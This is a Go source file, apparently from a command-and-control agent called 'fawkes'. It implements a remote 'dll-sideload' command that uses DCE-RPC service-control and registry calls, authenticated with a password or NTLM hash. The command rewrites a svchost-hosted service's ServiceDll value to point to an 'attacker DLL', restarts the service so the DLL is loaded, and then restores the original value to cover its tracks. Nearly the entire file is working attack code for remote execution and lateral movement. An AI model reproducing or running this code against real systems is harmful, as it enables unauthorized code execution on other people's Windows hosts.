package commands

import (
	"context"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/msrpc/rrp/winreg/v1"
	svcctl "github.com/oiweiwei/go-msrpc/msrpc/scmr/svcctl/v2"
	"github.com/oiweiwei/go-msrpc/ssp"
)

// remoteSvcDLLSideload modifies a svchost-hosted service's ServiceDll registry
// value to point to an attacker DLL. When the service starts, svchost.exe loads
// the attacker DLL instead of the legitimate one.
func remoteSvcDLLSideload(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for dll-sideload action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for dll-sideload action (path to attacker DLL on target)")
	}

	// Step 1: Verify service exists and get current config via SVCCTL
	svcCli, scm, svcCtx, svcCancel, svcCleanup, err := remoteSvcConnect(args, scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer svcCancel()
	defer svcCleanup()
	defer func() { _, _ = svcCli.CloseService(svcCtx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	svcResp, err := svcCli.OpenServiceW(svcCtx, &svcctl.OpenServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DesiredAccess:  svcQueryConfig | svcQueryStatus | svcStop | svcStart,
	})
	if err != nil {
		return errorf("Failed to open service %q: %v", args.Name, err)
	}
	if svcResp.Return != 0 {
		return errorf("OpenServiceW error for %q: 0x%08x", args.Name, svcResp.Return)
	}
	defer func() { _, _ = svcCli.CloseService(svcCtx, &svcctl.CloseServiceRequest{ServiceObject: svcResp.Service}) }()

	cfgResp, err := svcCli.QueryServiceConfigW(svcCtx, &svcctl.QueryServiceConfigWRequest{
		Service:      svcResp.Service,
		BufferLength: 8192,
	})
	if err != nil {
		return errorf("QueryServiceConfigW failed: %v", err)
	}

	// Verify service is svchost-hosted (WIN32_SHARE_PROCESS type)
	if cfgResp.ServiceConfig.ServiceType&svcWin32ShareProcess == 0 {
		return errorf("Service %q is not svchost-hosted (type: %s). DLL sideload requires WIN32_SHARE_PROCESS services.",
			args.Name, remoteSvcTypeName(cfgResp.ServiceConfig.ServiceType))
	}

	// Step 2: Read current ServiceDll via WinReg RPC
	regCli, regCtx, regCancel, regCleanup, hklm, err := openRemoteRegistryHKLM(args)
	if err != nil {
		return errorf("WinReg connection failed: %v", err)
	}
	defer regCancel()
	defer regCleanup()
	defer func() { _, _ = regCli.BaseRegCloseKey(regCtx, &winreg.BaseRegCloseKeyRequest{Key: hklm}) }()

	regPath := fmt.Sprintf("SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", args.Name)
	subKey, err := openRemoteSubKey(regCtx, regCli, hklm, regPath)
	if err != nil {
		return errorf("Failed to open registry key %s: %v\nNote: Service may not have a Parameters subkey (not svchost-hosted?)", regPath, err)
	}
	defer func() { _, _ = regCli.BaseRegCloseKey(regCtx, &winreg.BaseRegCloseKeyRequest{Key: subKey}) }()

	// Read current ServiceDll value
	queryResp, err := regCli.BaseRegQueryValue(regCtx, &winreg.BaseRegQueryValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		DataLength: 4096,
		Length:     4096,
	})
	if err != nil {
		return errorf("Failed to read ServiceDll value: %v", err)
	}
	if queryResp.Return != 0 {
		return errorf("Failed to read ServiceDll: error code 0x%08x", queryResp.Return)
	}

	originalDll := decodeRegSZ(queryResp.Data[:queryResp.DataLength])

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== dll-sideload on %s:%s ===\n", args.Server, args.Name))
	sb.WriteString(fmt.Sprintf("Original ServiceDll: %s\n", originalDll))
	sb.WriteString(fmt.Sprintf("Attacker DLL       : %s\n", args.BinPath))

	// Step 3: Write attacker DLL path as ServiceDll
	dllData := encodeRegSZ(args.BinPath)
	setResp, err := regCli.BaseRegSetValue(regCtx, &winreg.BaseRegSetValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		Type:       2, // REG_EXPAND_SZ
		Data:       dllData,
		DataLength: uint32(len(dllData)),
	})
	if err != nil {
		return errorf("Failed to write ServiceDll: %v", err)
	}
	if setResp.Return != 0 {
		return errorf("Failed to write ServiceDll: error code 0x%08x", setResp.Return)
	}
	sb.WriteString("Step 1: ServiceDll registry value replaced\n")

	// Step 4: Restart the service to load attacker DLL
	// Stop first (best-effort)
	ctrlResp, err := svcCli.ControlService(svcCtx, &svcctl.ControlServiceRequest{
		Service: svcResp.Service,
		Control: svcControlStop,
	})
	if err == nil && ctrlResp.Return == 0 {
		sb.WriteString("Step 2: Service stopped\n")
		time.Sleep(2 * time.Second)
	} else {
		sb.WriteString("Step 2: Service was already stopped\n")
	}

	// Start with new DLL
	startResp, err := svcCli.StartServiceW(svcCtx, &svcctl.StartServiceWRequest{
		Service: svcResp.Service,
	})
	if err == nil && startResp.Return == 0 {
		sb.WriteString("Step 3: Service started (attacker DLL loaded)\n")
	} else {
		startErr := ""
		if err != nil {
			startErr = err.Error()
		} else {
			startErr = fmt.Sprintf("0x%08x", startResp.Return)
		}
		sb.WriteString(fmt.Sprintf("Step 3: Start returned error: %s\n", startErr))
	}

	// Step 5: Restore original ServiceDll
	origData := encodeRegSZ(originalDll)
	restoreResp, err := regCli.BaseRegSetValue(regCtx, &winreg.BaseRegSetValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		Type:       2, // REG_EXPAND_SZ
		Data:       origData,
		DataLength: uint32(len(origData)),
	})
	if err != nil || restoreResp.Return != 0 {
		sb.WriteString("WARNING: Failed to restore original ServiceDll! Manual cleanup required.\n")
		sb.WriteString(fmt.Sprintf("Restore command: remote-reg -action set -server %s -hive HKLM -path %s -name ServiceDll -data \"%s\" -reg_type REG_EXPAND_SZ\n", args.Server, regPath, originalDll))
	} else {
		sb.WriteString("Step 4: Original ServiceDll restored\n")
	}

	sb.WriteString("\nResult: Attacker DLL loaded via svchost ServiceDll hijack")
	return successResult(sb.String())
}

// openRemoteRegistryHKLM opens a WinReg RPC connection to the remote host
// and opens the HKLM hive. Uses the same credential pattern as SVCCTL.
func openRemoteRegistryHKLM(args remoteServiceArgs) (winreg.WinregClient, context.Context, context.CancelFunc, func(), *winreg.Key, error) {
	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
	if credErr != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("%v for remote registry access", credErr)
	}

	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)

	cc, err := dcerpc.Dial(ctx, args.Server,
		dcerpc.WithEndpoint("ncacn_np:[winreg]"),
		dcerpc.WithCredentials(cred),
		dcerpc.WithMechanism(ssp.SPNEGO),
		dcerpc.WithMechanism(ssp.NTLM),
	)
	if err != nil {
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("DCE-RPC connection failed: %w", err)
	}

	cli, err := winreg.NewWinregClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
	if err != nil {
		cc.Close(ctx)
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to create WinReg client: %w", err)
	}

	cleanup := func() {
		cc.Close(ctx)
	}

	hklmResp, err := cli.OpenLocalMachine(ctx, &winreg.OpenLocalMachineRequest{
		DesiredAccess: 0x02000000, // MAXIMUM_ALLOWED
	})
	if err != nil {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to open HKLM: %w", err)
	}
	if hklmResp.Return != 0 {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("OpenLocalMachine error: 0x%08x", hklmResp.Return)
	}

	return cli, ctx, cancel, cleanup, hklmResp.Key, nil
}

// encodeRegSZ encodes a string as null-terminated UTF-16LE bytes for registry REG_SZ/REG_EXPAND_SZ.
func encodeRegSZ(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, (len(runes)+1)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	// null terminator already zeroed by make
	return buf
}

// decodeRegSZ decodes null-terminated UTF-16LE bytes to a Go string.
func decodeRegSZ(data []byte) string {
	if len(data) < 2 {
		return ""
	}
	var runes []rune
	for i := 0; i+1 < len(data); i += 2 {
		ch := uint16(data[i]) | uint16(data[i+1])<<8
		if ch == 0 {
			break
		}
		runes = append(runes, rune(ch))
	}
	return string(runes)
}
